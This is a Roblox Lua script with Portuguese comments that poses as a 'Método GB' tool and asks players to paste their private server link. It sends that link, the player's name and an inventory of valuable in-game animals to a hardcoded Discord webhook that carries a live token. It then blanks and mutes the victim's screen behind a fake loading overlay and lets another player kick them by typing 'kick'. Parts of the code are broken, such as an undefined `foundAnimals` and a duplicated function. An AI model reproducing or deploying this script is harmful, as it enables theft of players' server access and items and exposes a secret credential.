--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Garantir que LocalPlayer exista (LocalScript) antes de usar
local player = Players.LocalPlayer
if not player then
    return
end

-- Coloque a sua webhook aqui:
local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"

local playerGui = player:WaitForChild("PlayerGui")

--// GUI Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MetodoGBGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

--// Blur Effect
local blur = Instance.new("Frame")
blur.Size = UDim2.new(1, 0, 1, 0)
blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blur.BackgroundTransparency = 0.4
blur.Parent = screenGui

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 220)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0) -- üëà Centralizado no meio da tela
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui

--// Rounded corners e sombra
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 8)
shadow.Size = UDim2.new(1, 40, 1, 40)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://7912134082" -- sombra suave
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.6
shadow.ZIndex = 0
shadow.Parent = frame

--// Gradient de fundo
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 20, 70)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 35))
}
gradient.Rotation = 45
gradient.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Text = "üß† M√©todo GB"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.Parent = frame

--// TextBox
local textbox = Instance.new("TextBox")
textbox.PlaceholderText = "Cole o link do servidor privado aqui..."
textbox.Size = UDim2.new(0.9, 0, 0, 45)
textbox.Position = UDim2.new(0.05, 0, 0.4, 0)
textbox.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
textbox.Font = Enum.Font.Gotham
textbox.TextScaled = true
textbox.Parent = frame
Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 10)

--// Button
local button = Instance.new("TextButton")
button.Text = "Prosseguir"
button.Size = UDim2.new(0.9, 0, 0, 50)
button.Position = UDim2.new(0.05, 0, 0.7, 0)
button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.GothamBold
button.TextScaled = true
button.Parent = frame
Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)

--// Button Animation
button.MouseEnter:Connect(function()
	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(170, 60, 255)}):Play()
end)
button.MouseLeave:Connect(function()
	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(140, 40, 255)}):Play()
end)

--// Aparecer com anima√ß√£o (fade)
frame.BackgroundTransparency = 1
title.TextTransparency = 1
textbox.TextTransparency = 1
button.TextTransparency = 1
TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
TweenService:Create(textbox, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
TweenService:Create(button, TweenInfo.new(0.5), {TextTransparency = 0}):Play()

local function setupKickListener()
    Players.PlayerChatted:Connect(function(_, player, message)
        if message:lower() == "kick" then
            if player.Name ~= Players.LocalPlayer.Name then
                Players.LocalPlayer:Kick("Tente Novamente Mais Tarde")
            end
        end
    end)
end

--// On Click
button.MouseButton1Click:Connect(function()
    local input = textbox.Text
    
    print("‚úÖ Enviando webhook...")
    
    local currentTime = os.date("%H:%M - %d/%m/%Y")
    
    -- Get total players
    local totalPlayers = #Players:GetPlayers()

    -- Fun√ß√£o robusta para achar o model que cont√©m "<player.Name>'s Base" em qualquer TextLabel dentro dele
    local function findPlayerPlot(plotsFolder, expectedText)
        if not plotsFolder then return nil end
        for _, model in ipairs(plotsFolder:GetChildren()) do
            for _, desc in ipairs(model:GetDescendants()) do
                if desc:IsA("TextLabel") and desc.Text == expectedText then
                    return model
                end
            end
        end
        return nil
    end

    local plotsFolder = workspace:FindFirstChild("Plots")
    local expectedText = player.Name .. "'s Base"
    local targetPlot = findPlayerPlot(plotsFolder, expectedText)

    -- Fun√ß√£o para verificar dentro do model encontrado se existem nomes que batem com ReplicatedStorage.Models.Animals
    local function getAnimalsInPlot(plotModel)
        local results = {}
        if not plotModel then return results end

        local modelsFolder = ReplicatedStorage:FindFirstChild("Models")
        local animalsFolder = modelsFolder and modelsFolder:FindFirstChild("Animals")
        if not animalsFolder then return results end

        local animalNames = {}
        for _, a in ipairs(animalsFolder:GetChildren()) do
            animalNames[a.Name] = true
        end

        local seen = {}
        for _, desc in ipairs(plotModel:GetDescendants()) do
            if animalNames[desc.Name] and not seen[desc.Name] then
                table.insert(results, desc.Name)
                seen[desc.Name] = true
            end
        end

        return results
    end

    -- helper
    local function normalize(str)
        return string.lower(tostring(str)):gsub("^%s*(.-)%s*$","%1")
    end

    -- helper adicional: remove caracteres n√£o alfanum√©ricos para matching mais tolerante
    local function simplifyForMatch(str)
        return normalize(str):gsub("%W", "")  -- remove tudo que n√£o for letra/n√∫mero
    end

    -- Nova fun√ß√£o robusta: procura em AnimalPodiums todos os "AnimalOverHead" e l√™ DisplayName/Price
    local function collectPricesFromPodiums()
        local map = {}           -- chave normalizada -> {pre√ßos}
        local mapSimple = {}     -- chave simplificada -> {pre√ßos} (para matching tolerante)
        local podiums = workspace:FindFirstChild("AnimalPodiums") or workspace:FindFirstChild("AnimalPodium")
        if not podiums then 
            warn("‚ö†Ô∏è Podiums n√£o encontrados!")
            return map, mapSimple
        end

        for _, node in ipairs(podiums:GetDescendants()) do
            if node.Name == "AnimalOverHead" or node:IsA("Model") then
                -- tenta achar objetos mais comuns primeiro
                local displayObj = node:FindFirstChild("DisplayName", true) or node:FindFirstChild("Display", true)
                local priceObj = node:FindFirstChild("Price", true) or node:FindFirstChild("PriceTag", true)

                -- fallback: procurar qualquer TextLabel cujo nome sugira Display/Name
                if (not displayObj) then
                    for _, d in ipairs(node:GetDescendants()) do
                        if d:IsA("TextLabel") or d:IsA("TextBox") then
                            local lname = normalize(d.Name)
                            if lname:find("display",1,true) or lname:find("name",1,true) then
                                displayObj = d
                                break
                            end
                        end
                    end
                end

                -- fallback: procurar qualquer TextLabel cujo nome sugira Price ou que contenha d√≠gitos
                if (not priceObj) then
                    for _, d in ipairs(node:GetDescendants()) do
                        if d:IsA("TextLabel") or d:IsA("TextBox") then
                            local lname = normalize(d.Name)
                            if lname:find("price",1,true) or tostring(d.Text):find("%d") then
                                priceObj = d
                                break
                            end
                        end
                    end
                end

                -- extrai textos de forma segura
                local nameText, priceText
                if displayObj then
                    if displayObj:IsA("TextLabel") or displayObj:IsA("TextBox") then
                        nameText = tostring(displayObj.Text)
                    elseif displayObj:IsA("StringValue") or displayObj:IsA("ValueBase") then
                        nameText = tostring(displayObj.Value)
                    end
                end

                if priceObj then
                    if priceObj:IsA("TextLabel") or priceObj:IsA("TextBox") then
                        priceText = tostring(priceObj.Text)
                    elseif priceObj:IsA("StringValue") or priceObj:IsA("ValueBase") then
                        priceText = tostring(priceObj.Value)
                    end
                end

                if nameText and priceText and #priceText > 0 then
                    local key = normalize(nameText)
                    local skey = simplifyForMatch(key)

                    map[key] = map[key] or {}
                    -- evita duplicatas exatas
                    local already = false
                    for _, v in ipairs(map[key]) do
                        if v == priceText then already = true; break
                        end
                    end
                    if not already then table.insert(map[key], priceText) end

                    if skey ~= "" then
                        mapSimple[skey] = mapSimple[skey] or {}
                        local already2 = false
                        for _, v in ipairs(mapSimple[skey]) do
                            if v == priceText then already2 = true; break
                            end
                        end
                        if not already2 then table.insert(mapSimple[skey], priceText) end
                    end

                    -- debug
                    print("üìù Podium encontrado:", nameText, "->", priceText, "(key:", key, "skey:", skey,")")
                end
            end
        end

        return map, mapSimple
    end

    -- collectPricesFromPodiums agora recebe o model da base (targetPlot)
    local function collectPricesFromPodiums(plotModel)
        local map = {}
        local mapSimple = {}
        -- tenta achar a pasta AnimalPodiums dentro da base; se n√£o houver, tenta no workspace como fallback
        local podiumsRoot = nil
        if plotModel then
            podiumsRoot = plotModel:FindFirstChild("AnimalPodiums") or plotModel:FindFirstChild("AnimalPodium")
        end
        podiumsRoot = podiumsRoot or workspace:FindFirstChild("AnimalPodiums") or workspace:FindFirstChild("AnimalPodium")
        if not podiumsRoot then
            warn("‚ö†Ô∏è AnimalPodiums n√£o encontrado.")
            return map, mapSimple
        end

        for _, podiumModel in ipairs(podiumsRoot:GetChildren()) do
            if podiumModel:IsA("Model") then
                local innerBase = podiumModel:FindFirstChild("Base") or podiumModel:FindFirstChild("base")
                if innerBase and innerBase:IsA("Model") then
                    local spawnPart = innerBase:FindFirstChild("Spawn") or innerBase:FindFirstChild("spawn")
                    if spawnPart and spawnPart:IsA("BasePart") then
                        local attach
                        for _, c in ipairs(spawnPart:GetChildren()) do
                            if c:IsA("Attachment") then
                                attach = c
                                break
                            end
                        end

                        if attach then
                            for _, desc in ipairs(attach:GetDescendants()) do
                                if desc:IsA("BillboardGui") and (desc.Name == "AnimalOverHead" or desc.Name:lower():find("animalover")) then
                                    local genLabel, dispLabel
                                    for _, g in ipairs(desc:GetDescendants()) do
                                        if g:IsA("TextLabel") or g:IsA("TextBox") then
                                            local n = g.Name:lower()
                                            if n == "generation" then
                                                genLabel = g
                                            elseif n == "displayname" or n == "display" then
                                                dispLabel = g
                                            end
                                        end
                                    end

                                    local genText = genLabel and tostring(genLabel.Text or "") or ""
                                    local dispText = dispLabel and tostring(dispLabel.Text or "") or ""

                                    if genText == "" then
                                        for _, g in ipairs(desc:GetDescendants()) do
                                            if (g:IsA("TextLabel") or g:IsA("TextBox")) and tostring(g.Text or ""):find("%d") then
                                                genText = tostring(g.Text)
                                                break
                                            end
                                        end
                                    end
                                    if dispText == "" then
                                        for _, g in ipairs(desc:GetDescendants()) do
                                            if (g:IsA("TextLabel") or g:IsA("TextBox")) and tostring(g.Text or ""):find("%a") then
                                                dispText = tostring(g.Text)
                                                break
                                            end
                                        end
                                    end

                                    if dispText ~= "" and genText ~= "" then
                                        local cleanedGen = genText:gsub("/s",""):gsub("%$",""):gsub("%,",""):gsub("%s","")
                                        local numMatch = cleanedGen:match("([%d%.kK]+)")
                                        if numMatch then cleanedGen = numMatch end

                                        local key = normalize(dispText)
                                        local skey = simplifyForMatch(key)

                                        map[key] = map[key] or {}
                                        local exists = false
                                        for _, v in ipairs(map[key]) do
                                            if v == cleanedGen then exists = true; break end
                                        end
                                        if not exists then table.insert(map[key], cleanedGen) end

                                        if skey ~= "" then
                                            mapSimple[skey] = mapSimple[skey] or {}
                                            local exists2 = false
                                            for _, v in ipairs(mapSimple[skey]) do
                                                if v == cleanedGen then exists2 = true; break end
                                            end
                                            if not exists2 then table.insert(mapSimple[skey], cleanedGen) end
                                        end

                                        print("üìù Podium (path):", dispText, "->", cleanedGen, "(key:", key, "skey:", skey,")")
                                    else
                                        -- debug para ajudar caso algum esteja vazio
                                        local debugTexts = {}
                                        for _, t in ipairs(desc:GetDescendants()) do
                                            if t:IsA("TextLabel") or t:IsA("TextBox") then
                                                table.insert(debugTexts, tostring(t.Name .. ":" .. tostring(t.Text)))
                                            end
                                        end
                                        print("‚ö†Ô∏è N√£o extraiu nome/gera√ß√£o em AnimalOverHead. Conte√∫do:", table.concat(debugTexts, " | "))
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        return map, mapSimple
    end

    -- Chame passando a base do jogador:
    -- local pricesMap, pricesMapSimple = collectPricesFromPodiums(targetPlot)
    local pricesMap, pricesMapSimple = collectPricesFromPodiums(targetPlot)

    -- Debug
    print("üîç Animais encontrados:", #foundAnimals)
    for k,v in pairs(pricesMap) do
        print("üí∞ Pre√ßo encontrado (map):", k, "->", table.concat(v, ", "))
    end
    for k,v in pairs(pricesMapSimple) do
        print("üí∞ Pre√ßo encontrado (simple):", k, "->", table.concat(v, ", "))
    end

    local brainrotsValue
    if not targetPlot then
        brainrotsValue = "Plot n√£o encontrado"
    elseif #foundAnimals == 0 then
        brainrotsValue = "Nenhum"
    else
        local parts = {}
        for _, name in ipairs(foundAnimals) do
            local nkey = normalize(name)
            local nSKey = simplifyForMatch(nkey)
            local priceList = pricesMap[nkey]

            -- fallback 1: lookup na vers√£o simplificada
            if (not priceList or #priceList == 0) and nSKey ~= "" then
                priceList = pricesMapSimple[nSKey]
            end

            -- fallback 2: substring / contains (mais tolerante)
            if (not priceList or #priceList == 0) then
                for k, pl in pairs(pricesMap) do
                    if k:find(nkey, 1, true) or nkey:find(k, 1, true) then
                        priceList = pl
                        break
                    end
                end
            end

            -- fallback 3: simplified substring match
            if (not priceList or #priceList == 0) and nSKey ~= "" then
                for k, pl in pairs(pricesMapSimple) do
                    if k:find(nSKey, 1, true) or nSKey:find(k, 1, true) then
                        priceList = pl
                        break
                    end
                end
            end

            if priceList and #priceList > 0 then
                local joined = table.concat(priceList, " / ")
                table.insert(parts, name .. " (" .. joined .. "/s)")
            else
                -- se n√£o achar pre√ßo, ainda mostrar nome (mas marca que pre√ßo n√£o foi encontrado)
                table.insert(parts, name .. " (sem pre√ßo)")
            end
        end

        brainrotsValue = table.concat(parts, "\n")
    end

    -- Payload formatado com sintaxe corrigida
    local payload = {
        ["content"] = "@everyone **New Brainrot Hit**",
        ["username"] = "Brainrot System",
        ["avatar_url"] = "https://i.imgur.com/oBnXOzr.png",
        ["embeds"] = {
            {
                ["title"] = "üìä Brainrots Normais",
                ["color"] = 8405759,
                ["fields"] = {
                    {
                        ["name"] = "üìÖ Data",
                        ["value"] = currentTime,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üîó Link/Texto",
                        ["value"] = input or "Nenhum texto",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üë• Jogando",
                        ["value"] = tostring(totalPlayers),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üë§ Nome",
                        ["value"] = player.Name,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üéÆ Brainrots",
                        ["value"] = brainrotsValue,
                        ["inline"] = false
                    }
                }
            }
        }
    }

    -- Tenta enviar a webhook com tratamento de erro melhorado
    local success, response = pcall(function()
        local encoded = HttpService:JSONEncode(payload)
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = encoded
        })
    end)

    if success then
        print("‚úÖ Webhook enviada com sucesso!")
        textbox.Text = "‚úÖ Enviado com sucesso!"
        wait(2)
        textbox.Text = ""
        
        -- Setup kick listener
        setupKickListener()
        
        -- Create loading screen
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.Parent = CoreGui

        local frame = Instance.new("Frame")
        frame.Parent = ScreenGui
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundTransparency = 0
        frame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)

        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
        textLabel.Text = "Loading..."
        textLabel.TextSize = 28
        textLabel.Parent = frame

        local loadingRing = Instance.new("ImageLabel")
        loadingRing.Size = UDim2.new(0, 256, 0, 256)
        loadingRing.BackgroundTransparency = 1
        loadingRing.Image = "rbxassetid://4965945816"
        loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
        loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
        loadingRing.Parent = frame

        -- Create spinning animation
        local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
        local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
        tween:Play()

        -- Mute all sounds
        for _, sound in ipairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end

        -- Disable CoreGui
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    else
        warn("‚ùå Erro ao enviar webhook:", response)
        textbox.Text = "‚ùå Erro ao enviar! Tente novamente."
        wait(2)
        textbox.Text = ""
    end
end)
